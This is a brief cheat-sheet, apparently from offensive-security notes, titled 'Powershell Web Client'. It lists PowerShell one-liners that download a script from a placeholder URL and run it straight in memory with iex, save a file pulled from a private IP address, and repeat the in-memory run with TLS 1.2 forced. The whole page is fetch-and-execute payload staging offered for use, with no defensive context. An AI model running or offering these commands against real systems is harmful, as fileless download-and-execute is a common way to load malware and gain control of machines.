# Powershell Web Client

## Powershell Webclient

### Download and execute into memory

```csharp
iex((new-object net.webclient).downloadstring('http://URL/file.something'))
```

### Download and save

```csharp
iwr("http://10.110.0.66/tools/file.ps1") -OutFile file.ps1
```

### TLS \(in case of https ...\)

```csharp
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex((new-object net.webclient).
downloadstring('http://URL/file.something'))
```

